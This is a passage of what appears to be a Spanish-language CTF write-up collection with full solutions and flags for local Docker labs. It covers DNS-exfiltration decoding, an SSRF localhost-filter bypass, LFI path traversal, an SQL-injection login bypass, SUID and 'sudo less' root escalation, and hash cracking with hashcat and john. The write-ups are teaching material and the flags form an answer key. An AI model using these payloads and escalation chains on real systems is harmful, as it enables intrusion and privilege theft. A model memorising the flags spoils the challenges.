**Lo que vi:** un GET descarga un PNG por HTTP. Como la pista habla de una transferencia con \`Content-Type: image/png\`, la decisión es extraer ese objeto del PCAP.

### 2. Extraer el objeto del PCAP

**Herramienta:** \`tshark --export-objects\`. **Por qué:** reensambla los archivos transferidos por un protocolo (aquí HTTP) y los guarda a disco.

**Parámetros:** \`--export-objects "http,export"\` exporta los objetos HTTP a la carpeta \`export\`.

\`\`\`bash
$ tshark -r sala_control.pcap --export-objects "http,export"
$ file export/evidencia_sala.png
PNG image data, 48 x 48, 8-bit/color RGB, non-interlaced
\`\`\`

Se recuperó el PNG completo.

### 3. Revisar los metadatos del PNG

**Herramienta:** \`exiftool\`. **Por qué:** el PNG mide solo 48×48 y no parece contener nada visible, así que la flag debe estar en sus metadatos, no en los píxeles.

\`\`\`bash
$ exiftool -a export/evidencia_sala.png
...
Comment : WHOAMI{pcp4_c4rv3_4nd_m3rg3}
\`\`\`

La flag está en el campo \`Comment\` del PNG. ## Lección

Ante un PCAP con transferencia de archivos, usa \`--export-objects http\` para extraer los archivos y luego lee sus metadatos (EXIF/\`Comment\`): los retos forenses suelen esconder la flag ahí y no en los píxeles.`},
 {id:"exfiltracion-dns",title:"Exfiltración DNS",category:"Forense",points:300,slug:"exfiltracion-dns",files:["exfil_dns.pcap"],content:`# Exfiltración DNS

> Consultas DNS anómalas hacia \`exfil.blackout.redlatam\`. Reconstruye la secuencia y envía \`WHOAMI{...}\`.
>
> **Consejo:** filtra \`dns.qry.name\` o protocolo DNS en Wireshark.

**Flag:** \`WHOAMI{dns_3xf1l_bl4ck0ut}\`

---

## Resolución

Las consultas DNS son la vía de exfiltración: el nombre consultado esconde los datos en base32, numerados por fragmento.

### 1. Ver el tráfico DNS

**Herramienta:** \`tshark\`. **Por qué:** analiza PCAP por CLI; lo primero es listar los paquetes para ver qué hay.

\`\`\`bash
$ tshark -r exfil_dns.pcap
 1 DNS Standard query 0x0000 TXT 03-gn4gmmlml5rgynddnmyhk5d5.exfil.blackout.redlatam
 2 DNS Standard query 0x0000 TXT 02-mrxhgxy.exfil.blackout.redlatam
 3 DNS Standard query 0x0000 TXT 01-k5ee6qknjf5q.exfil.blackout.redlatam
\`\`\`

Cada consulta es \`NN-<payload base32>.exfil.blackout.redlatam\`: un número de secuencia más un fragmento en base32. **Lo que vi:** el prefijo numérico sugiere que hay que ordenar por ese número.

### 2. Extraer los nombres y ordenar por secuencia

**Herramienta:** \`tshark\` con filtro de display y campos. **Por qué:** extraer solo los nombres consultados y ordenarlos, en lugar de leer las líneas sueltas.

**Parámetros:** \`-Y "dns.qry.type == 16"\` filtra consultas TXT (tipo 16, las que llevan datos); \`-T fields -e dns.qry.name\` saca solo el campo del nombre; \`sort\` ordena.

\`\`\`bash
$ tshark -r exfil_dns.pcap -Y "dns.qry.type == 16" -T fields -e dns.qry.name | sort
01-k5ee6qknjf5q.exfil.blackout.redlatam
02-mrxhgxy.exfil.blackout.redlatam
03-gn4gmmlml5rgynddnmyhk5d5.exfil.blackout.redlatam
\`\`\`

### 3. Decodificar base32 en orden

**Herramienta:** \`base32 -d\`. **Por qué:** los fragmentos son base32. El base32 usa mayúsculas; el dominio va en minúsculas, así que se normaliza a mayúsculas antes de decodificar:

\`\`\`bash
$ echo "K5EE6QKNJF5Q" | base32 -d # WHOAMI{
$ echo "MRXHGXY" | base32 -d # dns_
$ echo "GN4GMMLML5RGYNDDNMYHK5D5" | base32 -d # 3xf1l_bl4ck0ut}
\`\`\`

Concatenando \`01\` → \`02\` → \`03\`:

\`\`\`
WHOAMI{ + dns_ + 3xf1l_bl4ck0ut} = WHOAMI{dns_3xf1l_bl4ck0ut}
\`\`\`

*"dns exfil blackout"

## Lección

En un PCAP con DNS sospechoso, filtra por \`dns.qry.name\`, fíjate en dominios raros con prefijos numerados y decodifica cada fragmento: la exfiltración por DNS suele esconder la flag en base32/base64 dentro de los nombres consultados.`},
 {id:"gateway-scada",title:"Gateway SCADA",category:"Web",points:500,slug:"gateway-scada",files:["startlab.sh", "blackout-web06.tar"],content:`# Gateway SCADA

> Gateway de consulta de telemetría. Descarga el zip del lab y ejecútalo en Kali/Linux con Docker.
>
> \`chmod +x startlab.sh && ./startlab.sh blackout-web06.tar\` → IP del lab (172.18.0.2). Enumera con nmap y ataca por HTTP.
>
> **Consejo:** enumera la IP del lab con nmap. Hay un gateway que consulta la URL de un nodo.

**Flag:** \`WHOAMI{ssrf_pl4nt4_n0rt3}\`

---

## Resolución

### 1. Levantar y enumerar

**Herramienta:** \`docker inspect\` + \`nmap\`. **Por qué:** obtengo la IP del contenedor y luego los servicios a los que atacar.

**Parámetros de nmap:** \`-sV\` (versión del servicio) y \`-p-\` (todos los puertos).

\`\`\`bash
$ unzip blackout-web06.zip && chmod +x startlab.sh && ./startlab.sh blackout-web06.tar
$ sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' blackout-web06
172.17.0.2

$ nmap -sV -p- 172.17.0.2
80/tcp open http Apache httpd 2.4.68 (Debian)
\`\`\`

Solo el puerto 80 → el ataque es por HTTP.

### 2. El gateway: campo "URL del nodo"

\`/gateway.php\` pide una URL y la previsualiza. El código hace \`curl_init($url)\` y vuelca la respuesta → **SSRF**. Bloquea \`localhost\`, \`127.\`, \`0.0.0.0\`, \`::1\`, \`169.254\`, \`file:\`, \`gopher:\`, \`dict:\`, \`ftp:\` — pero solo textualmente.

### 3. Bypass del bloqueo de localhost

\`127.0.0.1\` está bloqueado por el regex, pero **\`0x7f000001\` también resuelve a 127.0.0.1** y no contiene ninguna de las cadenas prohibidas:

\`\`\`bash
$ curl -X POST http://172.17.0.2/gateway.php \\
 --data-urlencode "url=http://0x7f000001:9090/"
{"nodo":"norte","sector":14,"kv":230}
\`\`\`

**Lo que vi:** respondió un servicio interno en el puerto 9090 del propio contenedor (un mini servidor HTTP). Escaneando puertos dentro del contenedor (\`netstat\`) se ve: \`0100007F:2382\` = \`127.0.0.1:9090\`.

### 4. Descubrir las rutas del servicio interno

Probando rutas, \`/registro\` devuelve el contenido que buscamos:

\`\`\`bash
$ curl -X POST http://172.17.0.2/gateway.php \\
 --data-urlencode "url=http://0x7f000001:9090/registro"
ZKRDPL{vvui_so4qw4_q0uw3}
\`\`\`

La cadena parece ROT/Caesar. \`ZKRDPL\` con desplazamiento **−3** = \`WHOAMI\`.

### 5. Decodificar el Caesar

**Herramienta:** \`tr\`. **Por qué:** reemplaza caracteres por rangos; sirve para aplicar el desplazamiento Caesar sin escribir código.

**Parámetros:** \`'A-Za-z' 'X-ZA-Wx-za-w'\` desplaza cada letra 3 posiciones hacia atrás (A→X, B→Y, …, Z→W).

\`\`\`bash
$ echo "ZKRDPL{vvui_so4qw4_q0uw3}" | tr 'A-Za-z' 'X-ZA-Wx-za-w'
WHOAMI{ssrf_pl4nt4_n0rt3}
\`\`\`

*"ssrf planta norte"> **Nota anti-trampa:** el binario interno \`/sbin/sys-daemon\` contiene otra cadena \`WHOAMI{docker_exec_detected_n1ce_try}\` — es un **honeypot** para quien haga \`docker exec cat /root/flag.txt\` en vez de resolver el SSRF. La flag real solo sale por el servicio interno.

## Lección

El SSRF con bloqueo de \`localhost\` no protege nada: se bypasea con representaciones alternas de la IP (\`0x7f000001\`, decimal, octal…). Luego explora puertos internos y rutas del servicio alcanzado. Y ojo con las cadenas trampa en los binarios del contenedor.`},
 {id:"informe-sector-14",title:"Informe sector 14",category:"Web",points:125,slug:"informe-sector-14",files:["startlab.sh", "blackout-web01.tar"],content:`# Informe sector 14

> LATAM Energía Red dejó un portal de consulta de informes tras el apagón del sector 14. Descarga el zip del lab y ejecútalo en Kali/Linux con Docker.
>
> \`chmod +x startlab.sh && ./startlab.sh blackout-web01.tar\` → IP del lab en la red Docker (172.18.0.2). Enumera con nmap y ataca por HTTP.
>
> **Consejo:** enumera la IP del lab con nmap. El portal expone varias secciones internas.

**Flag:** \`WHOAMI{lf1_d0c_s3ct0r14}\`

---

## Resolución

### 1. Levantar el lab

**Herramienta:** \`docker inspect\`. **Por qué:** el script de arranque no me deja la IP, así que la consulto al contenedor.

\`\`\`bash
$ unzip blackout-web01.zip && chmod +x startlab.sh && ./startlab.sh blackout-web01.tar
$ sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' blackout-web01
172.17.0.2
\`\`\`

### 2. Enumerar

**Herramienta:** \`nmap\`. **Por qué:** descubre los servicios a los que atacar.

**Parámetros:** \`-sV\` (versión del servicio), \`-p-\` (todos los puertos).

\`\`\`bash
$ nmap -sV -p- 172.17.0.2
80/tcp open http Apache httpd 2.4.68 (Debian)
\`\`\`

Solo el puerto 80. **Lo que vi:** en el index aparece un enlace sospechoso:

\`\`\`
/informes.php?informe=panel.php
\`\`\`

El parámetro \`informe\` toma el nombre de un archivo PHP → clásica **LFI (Local File Inclusion)** con path traversal.

### 3. Confirmar el LFI y leer archivos internos

\`informes.php\` hace \`include __DIR__ . '/pages/' . $informe;\` sin sanitizar \`../\`, así que se puede escapar de \`pages/\`:

\`\`\`bash
$ curl "http://172.17.0.2/informes.php?informe=../doc/latam_energia_recuperacion_sector14.dat"
LATAM ENERGIA RED — BLACKOUT LATAM
SUBESTACION NORTE / SECTOR 14
TIPO=recuperacion_post_apagon
REGISTRO=V0hPQU1Je2xmMV9kMGNfczNjdDByMTR9
\`\`\`

**Decisión:** probé \`../\` para salir de \`pages/\` y leer archivos del sistema. Se accedió a un archivo \`.dat\` de una carpeta interna \`doc/\` (pertenece a \`www-data\`, legible por el proceso PHP).

### 4. Decodificar el registro

El valor \`REGISTRO=\` termina en \`=\` y tiene caracteres que delatan **base64**:

\`\`\`bash
$ echo "V0hPQU1Je2xmMV9kMGNfczNjdDByMTR9" | base64 -d
WHOAMI{lf1_d0c_s3ct0r14}
\`\`\`

*"lfi doc sector14"

## Lección

Ante un parámetro que incluye archivos (\`?informe=xxx.php\`), prueba path traversal (\`../\`) para escapar del directorio permitido y leer archivos sensibles. Si el valor se decodifica a texto raro, suele ser base64.`},
 {id:"intranet-del-patio",title:"Intranet del patio",category:"Pentesting",points:500,slug:"intranet-del-patio",files:["startlab.sh", "blackout-pt04.tar"],content:`# Intranet del patio

> Intranet del patio Norte (caja, turnos e inventario). Descarga el zip del lab (Google Drive) y ejecútalo en Kali/Linux con Docker.
>
> \`chmod +x startlab.sh\`
> \`./startlab.sh blackout-pt04.tar\`
>
> El script muestra la IP del laboratorio (172.18.0.2). Enumera con nmap. No expongas el contenedor a internet.
>
> **Consejo:** empieza por nmap. Hay más de un servicio y más de una cuenta.

**Flag:** \`WHOAMI{1ntr4n3t_p4t10_n14}\`

---

## Resolución

El reto mezcla varios servicios (SNMP, FTP, SSH, web) y varias cuentas. Cada paso va encadenando credenciales hasta llegar a un binario SUID mal configurado que da root.

### 1. Levantar el lab y enumerar TCP + UDP

**Herramienta:** \`nmap\`. **Por qué:** el consejo dice "más de un servicio"; hay que escanear TCP y UDP.

**Parámetros:** \`-sT -p-\`/\`--top-ports\` (TCP), \`-sU\` (UDP), \`-sV\` (versiones).

\`\`\`bash
$ nmap -sT -T4 --top-ports 2000 172.17.0.2
21, 22, 23, 80, 199, 502 (Modbus), 2121, 8080

$ nmap -sU -T4 --top-ports 100 172.17.0.2
161/udp open snmp
\`\`\`

**Lo que vi:** SNMP en UDP (como en retos anteriores) y varios servicios TCP.

### 2. SNMP: obtener las primeras credenciales

**Herramienta:** \`snmpwalk\`. **Por qué:** la comunidad \`public\` suele exponer los campos de contacto, que en estos labs se usan como pista.

\`\`\`bash
$ snmpwalk -v2c -c public 172.17.0.2 1.3.6.1.2.1.1
sysContact = "admin"
sysLocation = "latam123"
\`\`\`

\`admin:latam123\` no sirve para SSH, pero es contexto.

### 3. Fuzzing web: encontrar el material oculto

**Herramienta:** \`gobuster\` + \`sitemap.xml\`. **Por qué:** el \`robots.txt\` y el sitemap revelan rutas que el menú no muestra.

\`\`\`bash
$ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -t 50
admin.php (302 → /login.php) index.php robots.txt sitemap.xml

$ curl -s http://172.17.0.2/robots.txt
Disallow: /backup-old/ /internal/
\`\`\`

### 4. El código PHP revela la cuenta FTP y su política

**Herramienta:** \`docker exec\` (lectura del código fuente). **Por qué:** entender el login web y localizar las credenciales de los servicios.

El login PHP lee \`/var/lib/latam/web.auth\` (hash SHA256 de \`lidia.subestacion\`). Y \`/var/lib/latam/admin.inc\` filtra el material del FTP:

\`\`\`
Usuario FTP local: respaldo.caja
clave_sha256: e724a9e1...
Politica FTP: RolCaja + # + Sitio + sector (sin espacios, sector dos digitos)
Rol del modulo: Caja Sitio: Norte
\`\`\`

**Decisión:** derivar la clave FTP de la política → \`Caja#Norte14\`, y verificar contra el hash SHA256.

### 5. Entrar al FTP con la política

**Herramienta:** \`python3\` + \`curl\`/\`nc\`. **Por qué:** la política da el formato exacto; se valida contra el hash y se usa en el FTP.

\`\`\`bash
$ python3 -c "import hashlib; print(hashlib.sha256(b'Caja#Norte14').hexdigest())"
e724a9e18832dc72... # coincide con admin.inc

$ curl -s "ftp://respaldo.caja:Caja%23Norte14@172.17.0.2/"
avisos/ bitacora/ inventario/ politicas/
\`\`\`

El FTP tiene material: \`bitacora/sesiones-2026.log\` menciona el titular **\`octavio.enlace\`** y \`politicas/rotacion_ssh.txt\` da la política SSH:

\`\`\`
Politica SSH: Nombre + : + Funcion + : + sector
Funcion: Enlace Nombre = primera parte del titular (antes del punto)
clave_sha256: cd3a402293a22448...
\`\`\`

→ Clave SSH derivada: **\`Octavio:Enlace:14\`** (verificada contra el SHA256).

### 6. Entrar por SSH

**Herramienta:** \`sshpass\` + \`ssh\`. **Por qué:** la clave SSH derivada de la política abre la cuenta \`octavio.enlace\`.

**Parámetros:** \`-o PubkeyAuthentication=no -o PreferredAuthentications=password\` fuerza autenticación por contraseña (evita el fallo por host key/pubkey).

\`\`\`bash
$ sshpass -p "Octavio:Enlace:14" ssh -o PubkeyAuthentication=no \\
 -o PreferredAuthentications=password octavio.enlace@172.17.0.2 "id"
uid=1001(octavio.enlace)
\`\`\`

### 7. Encontrar el vector de escalada

**Herramienta:** \`find -perm -4000\`. **Por qué:** localizar binarios SUID (corren con permisos de su dueño root).

\`\`\`bash
$ find / -perm -4000 -not -path "/proc/*" 2>/dev/null
/usr/lib/latam/in_apply ← SUID root
/usr/local/sbin/latam-backup
/usr/local/sbin/rf_sync
\`\`\`

**\`in_apply\` es explotable.** Se desensambla con \`objdump\`:

\`\`\`bash
$ objdump -d -M intel in_apply | sed -n '/<main>:/,/^$/p'
call getenv("HOME") # HOME controlado por el usuario
snprintf("%s/.inrc", HOME) # ruta: $HOME/.inrc
fgets(...) # lee la primera línea del archivo
call setuid(0); call setgid(0) # sube a root
call system(...) # ejecuta esa línea como root
\`\`\`

### 8. Escalar a root con \`$HOME/.inrc\`

**Herramienta:** shell. **Por qué:** \`in_apply\` ejecuta la primera línea de \`$HOME/.inrc\` como root; como el usuario controla \`$HOME\`, escribe el comando deseado.

\`\`\`bash
$ echo "id > /tmp/pwned; cat /var/lib/latam/intranet.dat > /tmp/f" > /home/octavio.enlace/.inrc
$ /usr/lib/latam/in_apply
$ cat /tmp/pwned
uid=0(root) gid=0(root)
$ cat /tmp/f
WHOAMI{1ntr4n3t_p4t10_n14}
\`\`\`

*"intranet patio n14"

## Lección

Cadena clásica de pentesting: SNMP filtra contexto → código fuente filtra una política de claves → la política deriva credenciales FTP y SSH → un binario SUID que ejecuta \`system()\` sobre un archivo controlado por el usuario (\`$HOME/.inrc\`) convierte el acceso en root. Y un detalle importante: forzar \`PreferredAuthentications=password\` evita fallos espurios de autenticación por pubkey.`},
 {id:"login-del-operador",title:"Login del operador",category:"Web",points:175,slug:"login-del-operador",files:["startlab.sh", "blackout-web02.tar"],content:`# Login del operador

> Portal de guardia de la subestación Norte. Descarga el zip del lab y ejecútalo en Kali/Linux con Docker.
>
> \`chmod +x startlab.sh && ./startlab.sh blackout-web02.tar\` → muestra la IP del lab (172.18.0.2). Enumera con nmap y ataca por HTTP.
>
> **Consejo:** enumera la IP del lab con nmap. El portal pide identificación de guardia.

**Flag:** \`WHOAMI{sql1_g3r3nt3_n0rt3}\`

---

## Resolución

### 1. Levantar el lab con Docker

**Herramienta:** \`docker inspect\`. **Por qué:** obtengo la IP del contenedor recién arrancado.

\`\`\`bash
$ unzip blackout-web02.zip
$ chmod +x startlab.sh && ./startlab.sh blackout-web02.tar
$ sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' blackout-web02
172.17.0.2
\`\`\`

### 2. Enumerar con nmap

**Herramienta:** \`nmap\`. **Por qué:** ver qué servicios hay antes de atacar.

**Parámetros:** \`-sV\` (versión), \`-p-\` (todos los puertos).

\`\`\`bash
$ nmap -sV -p- 172.17.0.2
PORT STATE SERVICE VERSION
80/tcp open http Apache httpd 2.4.68 (Debian)
\`\`\`

Solo el puerto 80: un portal PHP (\`X-Powered-By: PHP/8.2.33\`) con secciones Inicio / Estado / Acceso guardia / Comunidad / Contacto.

### 3. Analizar el login

El formulario de \`/login.php\` pide \`usuario\` y \`clave\`. Un vistazo al código (dentro del contenedor) revela una consulta SQL mal construida:

\`\`\`php
$sql = "SELECT ... FROM operadores WHERE usuario = '$usuario' AND clave = '$clave' LIMIT 1";
\`\`\`

Las variables se interpilan directo en la cadena → **SQL injection**.

### 4. Autenticarse por SQLi

**Herramienta:** \`curl\`. **Por qué:** enviar el POST de login con el payload de inyección.

**Parámetros:** \`-X POST\` y \`-d\` (cuerpo del formulario), \`-c cookies.txt\` (guardar la sesión).

\`\`\`bash
$ curl -s -X POST http://172.17.0.2/login.php \\
 -d "usuario=admin' OR '1'='1' -- &clave=x" -c cookies.txt
HTTP/1.1 302 Found
Set-Cookie: PHPSESSID=...
Location: /turno.php
\`\`\`

El \`' OR '1'='1' -- \` anula el resto del WHERE y el \`--\` comenta la comparación de la clave. Con la cookie quedamos autenticados como el primer operador (\`caja.turno\`), pero su nota no es la flag.

### 5. Inspeccionar la base de datos

**Herramienta:** \`sqlite3\`. **Por qué:** la flag no está en el primer registro, así que se revisa la base entera.

Revisando el SQLite dentro del contenedor aparecen los tres operadores:

\`\`\`bash
$ sqlite3 /var/lib/latam/guardia.db "SELECT * FROM operadores;"
1|caja.turno|CajaNorte14|caja|Cierre de caja sector 14. Sin novedad.
2|operador.norte|TurnoNorte26|operador|Relé SCADA en alerta. Esperando sync.
3|gerente.norte|N0rt3-G3r3nc14!|gerente|V0hPQU1Je3NxbDFfZzNyM250M19uMHJ0M30=
\`\`\`

La nota del **gerente** es base64:

\`\`\`bash
$ echo "V0hPQU1Je3NxbDFfZzNyM250M19uMHJ0M30=" | base64 -d
WHOAMI{sql1_g3r3nt3_n0rt3}
\`\`\`

*"sql gerente norte"

## Lección

Los formularios de login con intercalación directa de variables en SQL son un blanco clásico de inyección. La SQLi (\`' OR '1'='1' --\`) permite entrar sin credenciales, y a veces la flag vive en otra fila/tabla de la base — conviene inspeccionarla entera, no solo la primera coincidencia.`},
 {id:"mascara-latam",title:"Máscara LATAM",category:"Cripto",points:400,slug:"mascara-latam",files:["boveda.zip", "hash_maestra.sha256", "pista_ingeniero.txt"],content:`# Máscara LATAM

> Clave maestra del temporizador SCADA documentada solo como SHA256. La misma clave protege \`boveda.zip\`. Recupera \`WHOAMI{...}\`.
>
> **Consejo:** SHA256 sin salt → diccionario o ataque por máscara (\`hashcat -m 1400\`).

**Flag:** \`WHOAMI{m4sk_r3gl4s_s3ct0r14}\`

---

## Resolución

El paquete tiene el hash SHA256 de la clave maestra y \`boveda.zip\` (protegido con la misma clave). La pista del ingeniero revela el formato de la clave.

### 1. Entender el material

\`\`\`bash
$ cat hash_maestra.sha256
f87aeda6548379cbef181c6090e753e0d0d0ced60b5da9bd43f34600c36913d7
\`\`\`

\`\`\`bash
$ cat pista_ingeniero.txt
La clave maestra sigue el prefijo corporativo LATAM + el número de sector repetido (dos veces).
Ejemplo de forma: LATAM + 14 + 14
\`\`\`

**Decisión:** la pista da el formato exacto → \`LATAM\` + \`14\` + \`14\` = **\`LATAM1414\`**. Como conozco la estructura, no necesito fuerza bruta genérica: solo un ataque por máscara con esa forma.

### 2. Atacar el hash con máscara (hashcat -m 1400)

**Herramienta:** \`hashcat\`. **Por qué:** es el crackeador de hashes por GPU/CPU más rápido; el modo máscara prueba solo las combinaciones que coinciden con un patrón, ideal cuando se conoce la forma.

**Parámetros:**
- \`-m 1400\` → SHA2-256 sin salt.
- \`-a 3\` → ataque por máscara.
- \`'LATAM?d?d?d?d'\` → \`LATAM\` fijo seguido de 4 dígitos (\`?d\`), probando \`LATAM0000\`…\`LATAM9999\`.

\`\`\`bash
$ echo "f87aeda6548379cbef181c6090e753e0d0d0ced60b5da9bd43f34600c36913d7" > hash.txt
$ hashcat -m 1400 -a 3 hash.txt 'LATAM?d?d?d?d' --force
Status...........: Cracked
Hash.Mode........: 1400 (SHA2-256)
Candidate.Engine.: Device Generator
Candidates.#01...: LATAM1234 -> LATAM7394
\`\`\`

La clave recuperada es **\`LATAM1414\`**.

### 3. Desbloquear la bóveda

**Herramienta:** \`unzip\`. **Por qué:** abrir el zip con la contraseña recuperada.

**Parámetros:** \`-o\` (sobrescribir sin preguntar) y \`-P LATAM1414\` (proveer la contraseña).

\`\`\`bash
$ unzip -o -P LATAM1414 boveda.zip
extracting: flag.txt
$ cat flag.txt
WHOAMI{m4sk_r3gl4s_s3ct0r14}
\`\`\` ## Lección

Ante un SHA256 sin salt, no hay que invertirlo matemáticamente: se adivina. Si hay una pista de formato (prefijo + dígitos), un ataque por máscara (\`hashcat -m 1400 -a 3\`) con la forma exacta resuelve en segundos.`},
 {id:"nodo-del-patio-norte",title:"Nodo del patio Norte",category:"Pentesting",points:125,slug:"nodo-del-patio-norte",files:["startlab.sh", "blackout-pt01.tar"],content:`# Nodo del patio Norte

> LATAM Energía Red dejó el nodo del patio Norte en modo recuperación. Descarga el zip del lab (Google Drive) y ejecútalo en Kali/Linux con Docker.
>
> \`chmod +x startlab.sh\`
> \`./startlab.sh blackout-pt01.tar\`
>
> El script muestra la IP del laboratorio (172.18.0.2). Enumera con nmap. No expongas el contenedor a internet.
>
> **Consejo:** empieza por un nmap completo a la IP del lab. No asumas un solo puerto.

**Flag:** \`WHOAMI{ftp_p4t10_n0rt3}\`

---

## Resolución

Es un reto de pentesting: el consejo ("no asumas un solo puerto") indica que el servicio web no es lo único, y la cadena de ataque es FTP → llave SSH → usuario → escalada a root.

### 1. Levantar el lab

\`\`\`bash
$ sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' blackout-pt01
172.17.0.2
\`\`\`

### 2. Enumerar todos los puertos con nmap

**Herramienta:** \`nmap\`. **Por qué:** un escaneo de todos los puertos muestra la superficie completa; el consejo avisa de que hay más de un servicio.

**Parámetros:** \`-sV\` (versión del servicio) y \`-p-\` (los 65535 puertos, no solo los comunes).

\`\`\`bash
$ nmap -sV -p- 172.17.0.2
PORT STATE SERVICE VERSION
21/tcp open ftp vsftpd 3.0.3
22/tcp open ssh OpenSSH 9.2p1 Debian
80/tcp open http Apache httpd 2.4.68 (Debian)
\`\`\`

**Lo que vi:** tres servicios — FTP, SSH y HTTP. Como es pentesting, la cadena probablemente mezcla varios.

### 3. FTP anónimo

**Herramienta:** \`curl\` con usuario \`anonymous\`. **Por qué:** el FTP vsftpd suele permitir acceso anónimo; explorar es gratis.

\`\`\`bash
$ curl -s "ftp://172.17.0.2/" --user "anonymous:"
drwxr-xr-x avisos
drwxr-xr-x respaldo
\`\`\`

**Lo que vi:** hay una carpeta \`respaldo/norte\` con una **llave privada OpenSSH** (\`llave_patio\`) y un archivo \`turno_asignado.txt\` que dice "Titular: operador.norte". Decisión: esa llave debe servir para entrar por SSH.

\`\`\`bash
$ file llave_patio
OpenSSH private key
\`\`\`

### 4. Entrar por SSH con la llave

**Herramienta:** \`ssh\`. **Por qué:** la llave del FTP apunta al usuario \`operador.norte\` del puerto 22.

**Parámetros:** \`-i llave_patio\` (llave de identidad), \`-o StrictHostKeyChecking=no\` (no validar host key en el lab).

\`\`\`bash
$ chmod 600 llave_patio
$ ssh -i llave_patio operador.norte@172.17.0.2 "id"
uid=1000(operador.norte) gid=1000(operador.norte)
\`\`\`

### 5. Enumerar el sistema y encontrar la escalada

**Herramienta:** \`find\` + \`sudo -l\`. **Por qué:** busco dónde está la flag y qué puedo ejecutar como privilegiado.

\`\`\`bash
$ ssh -i llave_patio operador.norte@172.17.0.2 "sudo -l"
User operador.norte may run the following commands:
 (root) NOPASSWD: /usr/bin/less
\`\`\`

**Lo que vi:** puedo ejecutar **\`/usr/bin/less\` como root sin contraseña**. \`less\` permite lanzar comandos desde su prompt con \`!\` (GTFOBins): con eso consigo un shell root.

### 6. Escalar a root con \`sudo less\`

**Herramienta:** \`script -qc\` + \`sudo less\`. **Por qué:** \`less\` necesita un TTY para procesar el comando \`!\`; \`script -qc\` le crea un pseudo-TTY y le pasamos la secuencia por stdin.

\`\`\`bash
$ printf '!/bin/sh -c "id > /tmp/pwned"\\nq\\n' | script -qc "sudo less /etc/shadow" /dev/null
$ cat /tmp/pwned
uid=0(root) gid=0(root)
\`\`\`

**¡Root conseguido!** (\`uid=0\`). El \`!\` dentro de \`less\` ejecuta un shell como root.

### 7. Localizar la flag

Con root, busco los archivos de la flag:

\`\`\`bash
$ printf '!/bin/sh -c "ls -la /root; find / -iname *.dat 2>/dev/null | grep -v proc"\\nq\\n' | script -qc "sudo less /etc/shadow" /dev/null
/root/flag.txt
/var/lib/latam/patio.dat
\`\`\`

Dos candidatos. Los leo por separado:

\`\`\`bash
$ printf '!/bin/sh -c "cat /root/flag.txt > /tmp/a; cat /var/lib/latam/patio.dat > /tmp/b"\\nq\\n' | script -qc "sudo less /etc/shadow" /dev/null
=== root/flag.txt ===
WHOAMI{docker_exec_detected_n1ce_try}
=== /var/lib/latam/patio.dat ===
WHOAMI{ftp_p4t10_n0rt3}
\`\`\`

**La flag real es \`/var/lib/latam/patio.dat\`**: \`WHOAMI{ftp_p4t10_n0rt3}\`. La de \`/root/flag.txt\` es un **honeypot** — una trampa para quien intente \`docker exec cat /root/flag.txt\` en vez de resolver la cadena de ataque del reto (aparece el mismo señuelo en el reto Gateway SCADA). La flag del reto referencia justamente la vía de acceso: FTP + patio norte.

## Lección

En pentesting no hay que asumir un único servicio: el nmap completo (\`-p-\`) destapa la cadena completa. Aquí FTP anónimo filtró una llave SSH, y el sudo sin contraseña sobre \`less\` (GTFOBins) dio root con \`!\`. Y ojo con los honeypots: una flag en \`/root/flag.txt\` accesible por \`docker exec\` puede ser un señuelo, la real está en la vía de ataque pensada para el reto.`},
 {id:"pin-operador",title:"PIN del operador",category:"Cripto",points:125,slug:"pin-operador",files:["pin_operador.hash", "leeme.txt", "nota_recuperacion.zip"],content:`# PIN del operador

> Hash MD5 del PIN del panel local de la subestación Norte y un ZIP cifrado con esa misma clave. Recupera \`WHOAMI{...}\`.
>
> **Consejo:** identifica el tipo de hash (\`hashid\`, \`john --format=\`) y trabaja los tres archivos del pack.

**Flag:** \`WHOAMI{md5_p1n_0p3r4d0r}\`

---

## Resolución

El pack contiene un hash MD5 del PIN de un panel SCADA y un ZIP cifrado con ese mismo PIN. Si se recupera el PIN a partir del hash, se abre el ZIP y se obtiene la flag.

### 1. Descomprimir el pack y ver los archivos

\`\`\`bash
$ unzip pin_operador.zip
\`\`\`

Tres archivos:

- \`pin_operador.hash\` — el hash del PIN
- \`leeme.txt\` — contexto del reto
- \`nota_recuperacion.zip\` — el ZIP cifrado

### 2. Leer el contexto y el hash

\`\`\`bash
$ cat leeme.txt
Export parcial — terminal de guardia subestación Norte.
El PIN del operador protege la nota de recuperación (ZIP).
Hash encontrado en caché del panel SCADA.

$ cat pin_operador.hash
operador.turno:14a4d10c5f5e2cc97fdaf07b06ed3771
\`\`\`

El hash tiene 32 caracteres hexadecimales, longitud típica de **MD5**. El prefijo \`operador.turno:\` es solo el nombre del campo, no parte del valor.

### 3. Identificar el tipo de hash con \`hashid\`

**Herramienta:** \`hashid\`. **Por qué:** sirve para reconocer el algoritmo a partir del formato del hash, como aconseja el reto, antes de intentar romperlo.

\`\`\`bash
$ hashid 14a4d10c5f5e2cc97fdaf07b06ed3771
Analyzing '14a4d10c5f5e2cc97fdaf07b06ed3771'
[+] MD2
[+] MD5
[+] MD4
...
\`\`\`

El tamaño y el formato apuntan a **MD5** (los demás son candidatos por coincidir en longitud, no en algoritmo).

### 4. Comprobar que el ZIP está cifrado

**Herramienta:** \`unzip -t\` (test). **Por qué:** \`-t\` valida la integridad del archivo y, si está protegido, avisa que no puede leer el contenido sin contraseña.

\`\`\`bash
$ unzip -t nota_recuperacion.zip
 skipping: flag.txt unable to get password
\`\`\`

Confirma que el ZIP está cifrado y que la clave es la que buscamos.

### 5. Fuerza bruta del MD5 con \`john\`

**Herramienta:** \`john\` en modo \`--incremental\`. **Por qué:** un PIN corto sin sal se puede romper probando combinaciones; el modo incremental prueba caracteres imprimibles de longitud creciente hasta dar con el valor.

**Parámetros:** \`--format=raw-md5\` fija el algoritmo a MD5 puro (evita que john adivine), y \`--incremental\` activa el ataque de fuerza bruta de máscaras progresivas.

\`\`\`bash
$ echo "14a4d10c5f5e2cc97fdaf07b06ed3771" > pin.hash
$ john --format=raw-md5 --incremental pin.hash
sector14 (?)
\`\`\`

**Lo que vi:** john recuperó el valor **\`sector14\`** en segundos. No era un PIN numérico, sino una palabra ligada al contexto del reto (el sector 14), por eso una fuerza bruta numérica no lo hubiera encontrado.

### 6. Verificar el hash y abrir el ZIP

